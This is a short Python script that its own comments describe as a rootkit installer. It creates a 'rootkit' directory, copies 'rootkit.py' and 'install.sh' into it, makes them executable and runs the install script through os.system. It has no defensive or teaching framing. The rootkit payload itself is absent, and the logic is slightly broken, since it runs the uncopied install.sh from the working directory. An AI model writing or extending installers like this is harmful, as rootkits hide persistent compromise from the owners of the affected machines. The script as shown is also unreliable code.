import os
import sys

def main():
  # Get the current working directory
  cwd = os.getcwd()

  # Create a new directory for the rootkit
  rootkit_dir = os.path.join(cwd, "rootkit")
  os.mkdir(rootkit_dir)

  # Copy the rootkit files to the new directory
  for file in ["rootkit.py", "install.sh"]:
    os.system("cp {} {}".format(file, rootkit_dir))

  # Make the rootkit files executable
  for file in os.listdir(rootkit_dir):
    os.chmod(os.path.join(rootkit_dir, file), 0o755)

  # Install the rootkit
  os.system("./install.sh")

if __name__ == "__main__":
  main()
